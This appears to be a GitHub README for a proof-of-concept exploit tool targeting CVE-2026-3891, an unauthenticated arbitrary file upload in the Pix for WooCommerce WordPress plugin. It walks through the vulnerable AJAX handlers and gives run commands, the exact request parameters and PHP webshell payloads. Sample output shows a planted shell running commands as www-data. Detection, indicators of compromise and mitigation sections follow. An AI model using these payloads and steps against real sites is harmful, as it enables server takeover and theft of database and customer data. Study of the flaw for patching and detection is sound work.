<!--
  Keywords: CVE-2026-3891, Pix for WooCommerce, WordPress exploit, 
  unauthenticated file upload, remote code execution, proof of concept, 
  PHP webshell, penetration testing, ethical hacking, security research,
  WooCommerce RCE, 0day, red team
-->

# 🚀 CVE-2026-3891 – Pix for WooCommerce Unauthenticated File Upload RCE

![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
![Exploit](https://img.shields.io/badge/Exploit-PoC-red)
![CVE](https://img.shields.io/badge/CVE-2026--3891-critical)

[![GitHub stars](https://img.shields.io/github/stars/Ch4120N/CVE-2026-3891.svg)](https://github.com/Ch4120N/CVE-2026-3891/stargazers)
[![GitHub issues](https://img.shields.io/github/issues/Ch4120N/CVE-2026-3891.svg)](https://github.com/Ch4120N/CVE-2026-3891/issues)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

> **Proof‑of‑Concept exploit for CVE-2026-3891** – unauthenticated arbitrary file upload leading to remote code execution in the **Pix for WooCommerce** WordPress plugin (≤ 1.5.0).

---

## 📖 Overview

**CVE-2026-3891** is a critical vulnerability in the [Pix for WooCommerce](https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/) plugin, affecting all versions up to **1.5.0**. The plugin fails to enforce proper authorization and file‑type checks in its AJAX handler `lkn_pix_for_woocommerce_c6_save_settings`. An unauthenticated attacker can abuse this flaw to upload arbitrary PHP files to a publicly accessible directory and achieve remote code execution on the underlying WordPress server.

This repository contains a **production‑grade PoC** that automates the entire attack chain – from fetching a valid nonce to uploading a webshell – with robust error handling and a beautiful CLI interface.

### 🔍 Key Features
- **Truly unauthenticated** – no WordPress credentials or session cookies required.
- **Automatic nonce extraction** – the exploit retrieves the necessary security nonce via the same public AJAX interface.
- **Multipart file upload** – correctly crafts the `certificate_crt_path` file parameter expected by the vulnerable handler.
- **Direct URL generation** – immediately provides the public URL of the uploaded payload.
- **Post‑exploitation checks** – optional verification of upload success and on‑the‑fly command execution (`--check`).
- **Advanced error handling** – gracefully deals with Cloudflare, WAFs, timeouts, and malformed responses.
- **Clean, informative output** – all messages are prefixed with `[ * ]`, `[ + ]`, `[ - ]`, `[ ! ]` for instant readability.

---

## 🧬 Vulnerability Details

The root cause lies in two AJAX actions registered by the plugin:

### 1. `lkn_pix_for_woocommerce_generate_nonce`
```php
add_action('wp_ajax_nopriv_lkn_pix_for_woocommerce_generate_nonce', ...);
```
This action is hooked into `wp_ajax_nopriv_*`, making it accessible to **unauthenticated** visitors. It generates a nonce for the `lkn_pix_for_woocommerce_c6_settings_nonce` action and returns it in a JSON envelope:
```json
{"success":true,"data":{"nonce":"abc123..."}}
```
No capability check or user authentication is performed – anyone can request a valid nonce.

### 2. `lkn_pix_for_woocommerce_c6_save_settings`
```php
add_action('wp_ajax_lkn_pix_for_woocommerce_c6_save_settings', ...);
```
This handler saves plugin settings, including a file upload field named `certificate_crt_path`. Although the upload occurs through WordPress’s `media_handle_upload` **helper**, the plugin **does not**:
- Verify that the request is coming from an authenticated, authorised user (missing `current_user_can`).
- Enforce any file type or extension restrictions (e.g., allows `.php` files).
- Store the file in a non‑executable location – it ends up in:
  ```
  wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/
  ```
  which is **directly accessible via the web**.

Because the nonce only protects against CSRF, and it can be obtained by anyone, an attacker can chain these two actions to upload and execute arbitrary PHP code.

### Affected Versions
- **Pix for WooCommerce** versions **≤ 1.5.0**
- The vulnerability has been confirmed on clean WordPress installs with default configurations.

### Impact
- **Remote Code Execution** – full webshell access with the privileges of the web server (typically `www-data` or `apache`).
- **Data exfiltration** – read `wp-config.php`, database credentials, customer data.
- **Persistence** – modify core files, plant backdoors.
- **Complete site takeover** – escalate to WordPress admin if the database is accessible.

---

## 🛠️ Exploitation Requirements

- **Network access** to the target WordPress site (no authentication needed).
- **Python 3.8+** with the `requests` library (install via `pip install requests`).
- The target must have the vulnerable plugin installed and active (default configuration is sufficient).

---

## 🚀 Usage

### Installation
```bash
git clone https://github.com/Ch4120N/CVE-2026-3891.git
cd CVE-2026-3891
pip install -r requirements.txt   # requests
```

### Basic Command
```bash
python CVE-2026-3891.py http://target.com/wordpress
```

For more control, use command‑line options:
```bash
python CVE-2026-3891.py https://example.com \
  -f shell.php \
  -p '<?php system($_GET["c"]); ?>' \
  --check \
  --timeout 20
```

### Example Output
```
  ___  _  _  ____     ___   ___  ___    _       ___  ___  ___  __ 
 / __)( \/ )( ___)___(__ \ / _ \(__ \  / )  ___(__ )( _ )/ _ \/  )
( (__  \  /  )__)(___)/ _/( (_) )/ _/ / _ \(___)(_ \/ _ \\_  / )( 
 \___)  \/  (____)   (____)\___/(____)\___/    (___/\___/ (_/ (__)
                        [CVE-2026-3891]
          Pix for WooCommerce Unauthenticated File Upload
                         Owner: Ch4120N

[ * ] Warming up session (fetching homepage)...
[ * ] Homepage status: 200
[ * ] Requesting nonce (attempt 1/2)...
[ * ] Response status: 200
[ + ] Nonce obtained: 7e8f9a0b1c
[ * ] Uploading payload as woocommerce.php...
[ * ] Upload response status: 200
[ + ] Payload delivered to server.
[ * ] Verifying uploaded file at: http://192.168.56.102/wp-content/plugins/.../certs_c6/woocommerce.php
[ + ] File is accessible (HTTP 200).
[ + ] Webshell URL: http://192.168.56.102/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/woocommerce.php

# Optional check:
[ * ] Checking shell with command: id
[ + ] Command output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Command‑Line Options
| Flag | Description | Default |
|------|-------------|---------|
| `target` (positional) | Base URL of the WordPress site. | **Required** |
| `-f`, `--filename` | Name of the uploaded PHP file. | `woocommerce.php` |
| `-p`, `--payload` | PHP code to upload. | `<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>` |
| `-t`, `--timeout` | Request timeout in seconds. | `15` |
| `-r`, `--retries` | Max retries for nonce retrieval. | `2` |
| `--no-banner` | Suppress ASCII art. | (off) |
| `--no-verify` | Skip accessibility check after upload. | (off) |
| `--check` | Execute `id` on the webshell after upload. | (off) |

---

## 🧪 Technical Details for Detection & Tuning

### Nonce Generation Endpoint
- **URL:** `http://target/wp-admin/admin-ajax.php`
- **Action:** `lkn_pix_for_woocommerce_generate_nonce`
- **Parameter:** `action_name=lkn_pix_for_woocommerce_c6_settings_nonce`
- **Response:** `{"success":true,"data":{"nonce":"..."}}`
- **Note:** The nonce is **always obtainable** because the action is registered with `wp_ajax_nopriv_*`. No cookie or session is needed.

### File Upload Parameters
- **URL:** Same `admin-ajax.php`
- **Action:** `lkn_pix_for_woocommerce_c6_save_settings`
- **Required fields:**
  - `_ajax_nonce` – the nonce retrieved earlier
  - `certificate_crt_path` – a multipart file upload (the payload)
- **File type:** The plugin does not validate the extension, so `.php` files are accepted and stored without renaming.

### Public Storage Path
After successful upload, the file resides in:
```
/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/<filename>
```
This directory is **directly web‑accessible**; PHP files will be executed if the web server is configured to process them (which is the default for WordPress‑managed servers).

### Indicators of Compromise (IoCs)
- Unexpected PHP files appearing in the `certs_c6` directory (especially files like `woocommerce.php`, `shell.php`, etc.).
- Unusual `admin-ajax.php` POST requests with the actions listed above, originating from untrusted IPs.
- Access logs showing direct hits to `.../certs_c6/` with query parameters like `?cmd=id`.

---

## 🛡️ Detection & Mitigation

### Detection
Monitor your WordPress logs for:
- Repeated POST requests to `/wp-admin/admin-ajax.php` with `action=lkn_pix_for_woocommerce_generate_nonce` and `action=lkn_pix_for_woocommerce_c6_save_settings`.
- Creation of new files in the `certs_c6` folder. Use a file integrity monitoring tool (e.g., Tripwire, OSSEC) to alert on changes.
- Web server logs showing execution of PHP files in that directory from external IPs.

### Mitigation
1. **Update the plugin** – check for version >1.5.0 that contains the official fix (if released).
2. **Apply a virtual patch** – block access to the vulnerable AJAX actions with a WAF rule (e.g., ModSecurity, Cloudflare WAF).
3. **Restrict file execution** – if the plugin is required, configure your web server to deny PHP execution inside the `certs_c6` directory (e.g., using `.htaccess` with `php_flag engine off`).
4. **Harden AJAX handlers** – if you maintain the plugin, ensure that both actions are only accessible to authenticated and authorised users (`current_user_can('manage_options')` for the nonce generation, and a proper nonce verification plus capability check for the upload).
5. **Disable the plugin** – if Pix for WooCommerce is not essential, remove it entirely.

---

## 👏 Credits

- **Exploit Development & PoC:** [Ch4120N](https://github.com/Ch4120N)
- **Vulnerability Analysis:** Independent security research

---

## 📄 License

This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.

**Disclaimer:** This tool is intended for authorised security testing and educational use only. The author is not responsible for any misuse or damage caused by this software.

---

## 📚 References

- [NIST NVD – CVE-2026-3891](https://nvd.nist.gov/vuln/detail/CVE-2026-3891)
- [WordPress Plugin Repository – Pix for WooCommerce](https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/) (check changelog for fixed versions)
- [Patchstack / WPScan Vulnerability Database](https://patchstack.com/database/?search=CVE-2026-3891) (if entry exists)

---

## ⭐ Support

If you find this PoC useful, consider giving it a ⭐ on GitHub and sharing it responsibly. Contributions, issues, and pull requests are welcome!

---

**Happy hacking!** 🛡️